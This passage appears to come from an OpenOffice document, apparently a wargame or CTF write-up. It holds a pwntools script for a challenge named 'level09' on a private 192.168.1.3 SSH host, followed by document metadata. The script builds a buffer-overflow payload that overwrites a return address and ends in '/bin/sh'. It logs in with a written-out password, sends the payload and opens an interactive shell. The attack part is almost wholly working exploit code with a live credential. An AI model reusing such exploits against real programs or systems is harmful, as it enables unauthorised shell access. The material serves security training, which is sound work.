      <text:p text:style-name="P15"><text:span text:style-name="T2">from</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T5">pwn</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T2">import</text:span><text:span text:style-name="T11"> </text:span><text:span text:style-name="T7">*</text:span></text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"><text:span text:style-name="T6">payload</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">b</text:span><text:span text:style-name="T10">''</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T6">payload</text:span> <text:span text:style-name="T6">+=</text:span> <text:span text:style-name="T6">b</text:span><text:span text:style-name="T10">'A'</text:span> <text:span text:style-name="T6">*</text:span> <text:span text:style-name="T8">40</text:span></text:p>
      <text:p text:style-name="P13"><text:soft-page-break/><text:span text:style-name="T6">payload</text:span> <text:span text:style-name="T6">+=</text:span> <text:span text:style-name="T6">b</text:span><text:span text:style-name="T10">'\xff'</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T6">payload</text:span> <text:span text:style-name="T6">+=</text:span> <text:span text:style-name="T6">b</text:span><text:span text:style-name="T10">'B'</text:span> <text:span text:style-name="T6">*</text:span> <text:span text:style-name="T6">(</text:span><text:span text:style-name="T8">128</text:span> <text:span text:style-name="T6">-</text:span> <text:span text:style-name="T17">len</text:span><text:span text:style-name="T6">(payload))</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T6">payload</text:span> <text:span text:style-name="T6">+=</text:span> <text:span text:style-name="T6">b</text:span><text:span text:style-name="T10">'C'</text:span> <text:span text:style-name="T6">*</text:span> <text:span text:style-name="T8">199</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T6">payload</text:span> <text:span text:style-name="T6">+=</text:span> <text:span text:style-name="T6">b</text:span><text:span text:style-name="T10">'\x8c\x48\x55\x55\x55\x55'</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T6">payload</text:span> <text:span text:style-name="T6">+=</text:span> <text:span text:style-name="T6">b</text:span><text:span text:style-name="T10">'\x00'</text:span> <text:span text:style-name="T6">*</text:span> <text:span text:style-name="T6">(</text:span><text:span text:style-name="T8">1024</text:span> <text:span text:style-name="T6">-</text:span> <text:span text:style-name="T8">207</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T6">payload</text:span> <text:span text:style-name="T6">+=</text:span> <text:span text:style-name="T6">b</text:span><text:span text:style-name="T10">'/bin/sh\x00'</text:span></text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P13"><text:span text:style-name="T6">s</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">ssh(host=</text:span><text:span text:style-name="T10">"192.168.1.3"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">port=</text:span><text:span text:style-name="T8">4242</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">user=</text:span><text:span text:style-name="T10">"level09"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">password=</text:span><text:span text:style-name="T10">"fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S"</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P13"><text:span text:style-name="T6">p</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">s.process(</text:span><text:span text:style-name="T10">"/home/users/level09/./level09"</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P14">p.sendline(payload)</text:p>
      <text:p text:style-name="P10">p.interactive()</text:p>
      <text:p text:style-name="P4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0M31S</meta:editing-duration>
    <meta:editing-cycles>3</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.5$Win32 OpenOffice.org_project/415m1$Build-9789</meta:generator>
    <dc:date>2021-12-12T15:24:46.70</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="5" meta:object-count="0" meta:page-count="6" meta:paragraph-count="101" meta:word-count="1089" meta:character-count="6948"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>